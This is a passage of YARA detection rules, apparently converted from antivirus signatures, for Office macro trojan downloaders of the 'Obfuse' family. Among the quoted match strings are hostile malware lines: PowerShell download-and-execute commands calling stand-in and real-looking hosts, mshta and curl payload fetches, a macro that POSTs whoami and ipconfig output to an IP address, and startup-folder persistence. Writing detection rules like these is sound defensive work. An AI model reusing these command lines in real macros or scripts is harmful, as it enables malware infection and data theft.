        strings_accuracy = "High"
    strings:
        $x_1_1 = "Niokaser" ascii //weight: 1
        $x_1_2 = "\\KIOL.FERRAASS" ascii //weight: 1
        $x_1_3 = "www.compuplus.in/lays/reshy.php" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PAT_2147774268_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PAT!MTB"
        threat_id = "2147774268"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "MsgBox \"Macro popping Powershell!\", vbOKOnly, \"game over" ascii //weight: 1
        $x_1_2 = "Shell(\"powershell.exe -noexit -Command \"\"IEX ((new-object net.webclient).downloadstring('http://example.com/malicious/payload.exe'))\"\"\", 1)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RVJ_2147774299_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RVJ!MTB"
        threat_id = "2147774299"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {73 68 61 72 65 2e 67 65 74 63 6c 6f 75 64 61 70 70 2e 63 6f 6d 2f 78 51 75 6e 59 44 31 57 2f 64 6f 77 6e 6c 6f 61 64 2f 46 69 6e 61 6c 2e 70 69 66 3f 6b 3d 39 38 61 35 35 36 65 30 26 75 74 6d 5f 73 6f 75 72 63 65 3d 76 69 65 77 65 72 5f 6e 65 77 22 6f 00 49 6d 61 67 65 6d 53 69 6d 70 6c 65 73 43 44 54 20 3d 20 22 68 74 74 70 73 3a 2f 2f}  //weight: 1, accuracy: Low
        $x_1_2 = "Shell (M_S + TOGACDT + M_S1 + M_S2 + M_S3), 0" ascii //weight: 1
        $x_1_3 = "URLDownloadToFile 0, ImagemSimplesCDT, MasterCDT & \"document.pif\", 0, 0" ascii //weight: 1
        $x_1_4 = "PDf_3 = \"ng 127.0.0.1 -n 10 \"" ascii //weight: 1
        $x_1_5 = "RaboDeCavalo = \":\\Users\\Public\\document.\"" ascii //weight: 1
        $x_1_6 = "PDf_5 = \"exe\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RVK_2147775318_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RVK!MTB"
        threat_id = "2147775318"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "GetObject(Nuts(\"136122127126120126133132075\"))" ascii //weight: 1
        $x_1_2 = "Almonds = Right(Jelly, Len(Jelly) - 3)" ascii //weight: 1
        $x_1_3 = "Pears = Chr(Beets - 17)" ascii //weight: 1
        $x_1_4 = "Loop While Len(Milk) > 0" ascii //weight: 1
        $x_1_5 = "Get(Nuts(\"104122127068067112097131128116118132132\")).Create" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PAZ_2147775360_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PAZ!MTB"
        threat_id = "2147775360"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {53 68 65 6c 6c 20 22 43 3a 5c 57 69 6e 64 6f 77 73 5c 53 79 73 74 65 6d 33 32 5c 6d 73 68 74 61 2e 65 78 65 20 68 74 74 70 73 3a 2f 2f 77 77 77 2e 6d 69 6e 70 69 63 2e 64 65 2f 6b 2f 62 [0-21] 2f [0-21] 2f 20 22 2c 20 30}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PBA_2147775382_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PBA!MTB"
        threat_id = "2147775382"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Shell (\"powershell.exe" ascii //weight: 1
        $x_1_2 = "Invoke-WebRequest http://mailicious.com/filemanager.exe -OutFile C:\\\\filemanager.exe" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PBA_2147775382_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PBA!MTB"
        threat_id = "2147775382"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "tmpTotal = tmpTotal + CInt(Mid$(tmpStr, 1, 1))" ascii //weight: 1
        $x_1_2 = "tmpTotal + CInt(Mid$(\"4210589632\", i, 1)" ascii //weight: 1
        $x_1_3 = "j = FreeFile" ascii //weight: 1
        $x_1_4 = "Open (\"c:\\programdata\\Milne.CMD\") For Output As #j" ascii //weight: 1
        $x_1_5 = "Print #j, WDFRTVGBYHBEDRFTGYH.mlbl.Caption & b" ascii //weight: 1
        $x_1_6 = "WinExec \"cmd /c" ascii //weight: 1
        $x_1_7 = "calcModulus10 = tmpTotal" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PAX_2147775458_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PAX!MTB"
        threat_id = "2147775458"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {50 72 69 76 61 74 65 20 61 28 [0-6] 29 20 41 73 20 56 61 72 69 61 6e 74}  //weight: 1, accuracy: Low
        $x_1_2 = "= FreeFile" ascii //weight: 1
        $x_1_3 = "= Environ(\"TMP\") & \"\\test_make_doc.exe" ascii //weight: 1
        $x_1_4 = {3d 20 53 68 65 6c 6c 28 [0-21] 2c 20 31 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PAX_2147775458_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PAX!MTB"
        threat_id = "2147775458"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Open \"C:\\Users\\Public\\Documents\\1.dot" ascii //weight: 1
        $x_1_2 = "Set rootFolder = service.GetFolder(\"\\\")" ascii //weight: 1
        $x_1_3 = {3d 20 4d 69 64 24 28 [0-15] 2c 20 58 2c 20 31 29}  //weight: 1, accuracy: Low
        $x_1_4 = "= Value + Chr(Val(\"&h\" & num))" ascii //weight: 1
        $x_1_5 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 48 32 41 28 48 32 41 28 41 72 72 61 79 4c 69 73 74 28 [0-4] 29}  //weight: 1, accuracy: Low
        $x_1_6 = "Call service.Connect" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PAY_2147775459_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PAY!MTB"
        threat_id = "2147775459"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= \"eval(eval(String.fromCharCode\" +" ascii //weight: 1
        $x_1_2 = "= \"j\" + \"o\" + \"b\" + \"s\" + \"website\" + \".\" + \"j\" + \"s" ascii //weight: 1
        $x_1_3 = {3d 20 53 68 65 6c 6c 28 22 77 73 63 72 69 70 74 20 22 20 2b 20 [0-21] 2c 20 76 62 4e 6f 72 6d 61 6c 46 6f 63 75 73 29}  //weight: 1, accuracy: Low
        $x_1_4 = {43 72 65 61 74 65 54 65 78 74 46 69 6c 65 28 [0-21] 2c 20 54 72 75 65 2c 20 54 72 75 65 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BNK_2147775709_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BNK!MTB"
        threat_id = "2147775709"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "ChrW(CLng((Not" ascii //weight: 1
        $x_1_2 = "Debug.Print" ascii //weight: 1
        $x_1_3 = "= IsDate(CLng" ascii //weight: 1
        $x_1_4 = "= IEfvKhGcYzdp.Z2Dq7_bN05" ascii //weight: 1
        $x_1_5 = "= Len(Join(Array(P9DUM_Y4Iv_TN8_FbRV" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BVK_2147775939_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BVK!MTB"
        threat_id = "2147775939"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "ChrW(CLng((Not" ascii //weight: 1
        $x_1_2 = "Debug.Print" ascii //weight: 1
        $x_1_3 = "= IsDate(CLng" ascii //weight: 1
        $x_1_4 = "= Vpq7900rKJ.W1VFigp5mwqm20es" ascii //weight: 1
        $x_1_5 = "= Len(Join(Array(Vdp8avLtA4" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BTK_2147775940_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BTK!MTB"
        threat_id = "2147775940"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "ChrW(CLng((Not" ascii //weight: 1
        $x_1_2 = "Debug.Print" ascii //weight: 1
        $x_1_3 = "= IsDate(CLng" ascii //weight: 1
        $x_1_4 = "fAupDP09ZgpN.kjbX_2ZUN_sUI" ascii //weight: 1
        $x_1_5 = "= Len(Join(Array(\"XGN00hcdHZ" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BTK_2147775940_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BTK!MTB"
        threat_id = "2147775940"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "ChrW(CLng((Not" ascii //weight: 1
        $x_1_2 = "Debug.Print" ascii //weight: 1
        $x_1_3 = "= IsDate(CLng" ascii //weight: 1
        $x_1_4 = "= ZE0zZVG8nzUS.AIuE_foy_oaO_LNr0" ascii //weight: 1
        $x_1_5 = "= Len(Join(Array(g0ri_IkHe_6ya_xmy" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BTK_2147775940_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BTK!MTB"
        threat_id = "2147775940"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "ChrW(CLng((Not" ascii //weight: 1
        $x_1_2 = "Debug.Print" ascii //weight: 1
        $x_1_3 = "= Join(Array(ChrW(CLng((Not" ascii //weight: 1
        $x_1_4 = "= Dtjw9_c9uR_qLnf_vqi.nBXYM3T" ascii //weight: 1
        $x_1_5 = "= Len(Join(Array(EibI20046C5" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RVL_2147776083_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RVL!MTB"
        threat_id = "2147776083"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "obj = CreateObject(\"wscript.shell\")" ascii //weight: 1
        $x_1_2 = {33 39 2e 31 30 30 2e 31 35 39 2e 38 2f 61 61 61 22 20 2b 20 52 75 6e 52 65 73 75 6c 74 20 2b 20 52 75 6e 52 65 73 75 6c 74 77 68 6f 61 6d 69 3d 00 55 52 4c 20 3d 20 22 68 74 74 70 3a 2f 2f}  //weight: 1, accuracy: Low
        $x_1_3 = "objHTTP.Open \"POST\", URL, False" ascii //weight: 1
        $x_1_4 = "exeRs = obj.Exec(\"whoami\")" ascii //weight: 1
        $x_1_5 = "obj.Exec(\"ipconfig \")" ascii //weight: 1
        $x_1_6 = "exeRs.StdOut.ReadAll" ascii //weight: 1
        $x_1_7 = "objHTTP.send (\"\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PUH_2147776173_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PUH!MTB"
        threat_id = "2147776173"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "10"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Lib \"user32.dll\" Alias \"PostMessageA\" (ByVal" ascii //weight: 1
        $x_1_2 = "= Environ(" ascii //weight: 1
        $x_1_3 = "Private Const QmRX_NDR As Long = &H102" ascii //weight: 1
        $x_1_4 = "= Join(Array(" ascii //weight: 1
        $x_1_5 = "Cxsgw1Bd = Len(Join(Array(\"lcAap_WPRE GnKdBEAHx" ascii //weight: 1
        $x_1_6 = "With GetObject(RdZlh_PxyD)" ascii //weight: 1
        $x_1_7 = ".Create VlDqcYjjaArKK62S, Null," ascii //weight: 1
        $x_1_8 = "Close #CLng((" ascii //weight: 1
        $x_1_9 = "Open MjtZBZDxcrxcBTBqC For Binary As #CLng(((" ascii //weight: 1
        $x_1_10 = "Put #CLng((" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PUI_2147776298_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PUI!MTB"
        threat_id = "2147776298"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "TempPath = Environ(\"TMP\") + \"\\\"" ascii //weight: 1
        $x_1_2 = "\\appdata\\roaming\\MicrosoftBackup.vbs" ascii //weight: 1
        $x_1_3 = "MZ%90%00%03%00" ascii //weight: 1
        $x_1_4 = "= \"\" /s \"\" + apppath + \"\"\\backup.dll\"\"\" & vbNewLine" ascii //weight: 1
        $x_1_5 = "oWS.SpecialFolders(\"\"startup\"\")\" & vbNewLine" ascii //weight: 1
        $x_1_6 = "WinHttpReq.Open \"POST\", myURL, False, \"\", \"\"" ascii //weight: 1
        $x_1_7 = "Shell \"wscript \" + OutPutFileName, vbHide" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RVM_2147776437_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RVM!MTB"
        threat_id = "2147776437"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "vb09 = GetObject(\"new:72C24DD5-D70A-438B-8A42-98424B88AFB8\")" ascii //weight: 1
        $x_1_2 = ".Paragraphs.Count To 1 Step -1" ascii //weight: 1
        $x_1_3 = {3d 20 52 65 70 6c 61 63 65 28 [0-9] 2c 20 22 [0-12] 22 2c 20 22 22 29}  //weight: 1, accuracy: Low
        $x_1_4 = {76 62 30 39 2e 52 75 6e 20 47 72 61 76 69 74 79 20 26 20 22 22 20 26 20 [0-9] 2c 20 30 2e 30 30 30 31}  //weight: 1, accuracy: Low
        $x_1_5 = "Call nmngtyy" ascii //weight: 1
        $x_1_6 = "oRng.MoveEndWhile Chr(32)" ascii //weight: 1
        $x_1_7 = "MsgBox \"This is bold\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RVN_2147776443_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RVN!MTB"
        threat_id = "2147776443"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {6b 69 74 68 75 61 74 70 68 61 6e 6d 65 6d 2e 30 30 30 77 65 62 68 6f 73 74 61 70 70 2e 63 6f 6d 2f 63 68 61 72 65 2f 74 65 73 74 2e 7a 69 70 53 00 6f 53 68 65 6c 6c 2e 52 75 6e 20 22 63 6d 64 2e 65 78 65 20 2f 63 20 63 75 72 6c 20 68 74 74 70 73 3a 2f 2f}  //weight: 1, accuracy: Low
        $x_1_2 = "oShell = CreateObject(\"WScript.Shell\")" ascii //weight: 1
        $x_1_3 = "--output D:\\zz.zip\", 0, False" ascii //weight: 1
        $x_1_4 = "Application.Visible = True" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PKW_2147776494_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PKW!MTB"
        threat_id = "2147776494"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 4e 61 6d 65 73 70 61 63 65 28 [0-10] 29 2e 53 65 6c 66 2e 49 6e 76 6f 6b 65 56 65 72 62 20 22 50 61 73 74 65 22}  //weight: 1, accuracy: Low
        $x_1_2 = {4e 61 6d 65 20 [0-10] 20 2b 20 22 5c 4c 43 53 53 57 2e 74 78 74 22 20 41 73 20 [0-10] 20 2b 20 22 5c 4c 43 53 53 57 2e 6a 73 22}  //weight: 1, accuracy: Low
        $x_1_3 = {49 66 20 44 69 72 28 [0-10] 20 2b 20 22 5c 4c 43 53 53 57 2e 74 78 74 22 29 20 3d 20 22 22 20 54 68 65 6e 02 00 41 70 70 6c 69 63 61 74 69 6f 6e 2e 57 61 69 74 20 28 4e 6f 77 20 2b 20 54 69 6d 65 56 61 6c 75 65 28 22 30 3a 30 30 3a 30 32 22 29 29}  //weight: 1, accuracy: Low
        $x_1_4 = "If InStr(1, Sh.Name, \"Object\", 1) Then" ascii //weight: 1
        $x_1_5 = "Sh.Copy" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BLK_2147776536_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BLK!MTB"
        threat_id = "2147776536"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "ChrW(CLng((Not" ascii //weight: 1
        $x_1_2 = "Debug.Print" ascii //weight: 1
        $x_1_3 = "= CauTts2s.VSvwc3L" ascii //weight: 1
        $x_1_4 = "= Len(Join(Array(JDL3whmc" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BLK_2147776536_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BLK!MTB"
        threat_id = "2147776536"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "ChrW(CLng((Not" ascii //weight: 1
        $x_1_2 = "Debug.Print" ascii //weight: 1
        $x_1_3 = "= RCub_Mhh_xYAl_7wT.DHtEoo3J" ascii //weight: 1
        $x_1_4 = "= Len(Join(Array(gmBJp_20s" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BLK_2147776536_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BLK!MTB"
        threat_id = "2147776536"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "ChrW(CLng((Not" ascii //weight: 1
        $x_1_2 = "Debug.Print" ascii //weight: 1
        $x_1_3 = "= WQWVC_DGR4_wV09_due.OgB0_c1f_SUQ" ascii //weight: 1
        $x_1_4 = "= Len(Join(Array(PPEOahmLhf" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BLK_2147776536_3
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BLK!MTB"
        threat_id = "2147776536"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "ChrW(CLng((Not" ascii //weight: 1
        $x_1_2 = "Debug.Print" ascii //weight: 1
        $x_1_3 = "= bgtJj_UiH7_jmP.PszXs_GWkN" ascii //weight: 1
        $x_1_4 = "= Len(Join(Array(EEbpm_D3q_2ZY6_WA8" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BLK_2147776536_4
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BLK!MTB"
        threat_id = "2147776536"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "ChrW(CLng((Not" ascii //weight: 1
        $x_1_2 = "Debug.Print" ascii //weight: 1
        $x_1_3 = "= Join(Array(ChrW(CLng((Not" ascii //weight: 1
        $x_1_4 = "= HgYl_Dv5_Oai_73S.HngWnqKWSW9" ascii //weight: 1
        $x_1_5 = "= Len(Join(Array(Dnki3exOuFgLml" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BLK_2147776536_5
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BLK!MTB"
        threat_id = "2147776536"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = ".ShellExecute \"P\" + fjkerooos, fgfjhfgfg, \"\", \"\", 0" ascii //weight: 1
        $x_1_2 = "= xcmEkVwRdYsGDSUM(bFBqosfTsoTE, t7gh0, gtmsd)" ascii //weight: 1
        $x_1_3 = "= HLEWHWeDnDhPSPeo(XTDDmwxRDQLk, t7gh0, gtmsd)" ascii //weight: 1
        $x_1_4 = "= pTZcMXeijxbZTZQv(JfyXzcClYBPV, t7gh0, gtmsd)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (2 of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RVO_2147777663_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RVO!MTB"
        threat_id = "2147777663"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Range(\"FF1200\").Value" ascii //weight: 1
        $x_1_2 = "Shell(zoon, vbNormalFocus)" ascii //weight: 1
